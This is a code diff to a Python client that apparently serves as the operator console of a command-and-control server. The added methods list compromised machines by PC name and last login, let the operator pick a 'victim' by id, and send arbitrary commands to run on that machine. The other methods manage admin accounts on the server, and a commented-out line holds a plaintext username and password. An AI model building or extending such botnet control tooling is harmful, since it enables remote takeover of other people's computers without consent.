@@ -1,3 +1,5 @@
+from pprint import pprint
+
 import requests
 import json
 
@@ -11,9 +13,10 @@ def fake_hashed_password(password):
 class Client:
     def __init__(self):
         self.jwt_token = None
+        self.victim_id = None
 
     def login(self, username: str, password: str):
-        ans = requests.post(f"http://{CONFIG.ip}/login_admin/",
+        ans = requests.post(f"{CONFIG.host}/login_admin/",
                             json={
                                 "admin_login": username,
                                 "admin_hash_password": fake_hashed_password(password)
@@ -27,7 +30,7 @@ class Client:
         return "login error!"
 
     def who_is(self):
-        ans = requests.get(f"http://{CONFIG.ip}/who_is",
+        ans = requests.get(f"{CONFIG.host}/who_is",
                            headers={
                                'accept': 'application/json',
                                'Authorization': self.jwt_token
@@ -37,7 +40,7 @@ class Client:
         return f"error {ans.content.decode('utf-8')}"
 
     def create_new_admin(self, new_user_name: str, new_password: str, is_super_admin: bool = False):
-        ans = requests.post(f"http://{CONFIG.ip}/create_new_admin",
+        ans = requests.post(f"{CONFIG.host}/create_new_admin",
                             headers={
                                 'accept': 'application/json',
                                 'Authorization': self.jwt_token
@@ -52,7 +55,7 @@ class Client:
         return f"error {ans.content.decode('utf-8')}"
 
     def set_active_admin(self, username, active):
-        ans = requests.post(f"http://{CONFIG.ip}/set_active_admin",
+        ans = requests.post(f"{CONFIG.host}/set_active_admin",
                             headers={
                                 'accept': 'application/json',
                                 'Authorization': self.jwt_token
@@ -66,7 +69,7 @@ class Client:
         return f"error {ans.content.decode('utf-8')}"
 
     def delete_admin(self, username):
-        ans = requests.post(f"http://{CONFIG.ip}/delete_admin",
+        ans = requests.post(f"{CONFIG.host}/delete_admin",
                             headers={
                                 'accept': 'application/json',
                                 'Authorization': self.jwt_token
@@ -78,16 +81,47 @@ class Client:
             return ans.content.decode('utf-8')
         return f"error {ans.content.decode('utf-8')}"
 
+    def get_users(self):
+        ans = requests.get(f"{CONFIG.host}/get_users",
+                           headers={
+                               'accept': 'application/json',
+                               'Authorization': self.jwt_token
+                           })
+        if ans.status_code == 200:
+            return json.loads(ans.content.decode('utf-8'))
+        return f"error {ans.content.decode('utf-8')}"
+
+    def set_vicitm_id(self, vicitm_id: int):
+        self.victim_id = vicitm_id
+        return "victim is set"
+
+    def set_command(self, command: str):
+        if self.victim_id:
+            ans = requests.post(f"{CONFIG.host}/set_command",
+                               headers={
+                                   'accept': 'application/json',
+                                   'Authorization': self.jwt_token
+                               },
+                                json={
+                                    "victim_id": self.victim_id,
+                                    "command": command
+                                })
+            if ans.status_code == 200:
+                return ans.content.decode('utf-8')
+            return f"error {ans.content.decode('utf-8')}"
+        return "you did not choose a victim"
+
 
 c = Client()
 
 # c.login("123456789", "987654321")
-# # c.who_is()
+# c.who_is()
 #
-# print(c.create_new_admin("saveliy01", "cfdtkbq2005", True))
+# # print(c.create_new_admin("saveliy01", "cfdtkbq2005", True))
 # print(c.who_is())
+# print(c.get_users())
 
-
+#
 def listen(command: str, **args):
     if command == "login":
         username = input("Username: ")
@@ -111,6 +145,13 @@ def listen(command: str, **args):
     elif command == "delete admin":
         username = input("Username: ")
         print(c.delete_admin(username))
+    elif command == "get all users":
+        for i in c.get_users()["users"]:
+            print(f"{i['id']}\tpc_name: {i['pc_name']}\t\ttime: {i['last_login_time']}")
+    elif command == "set victim":
+        print(c.set_vicitm_id(int(input("Vicitm id: "))))
+    elif command == "set command":
+        print(c.set_command(input("command: ")))
     print("-------")
 
 
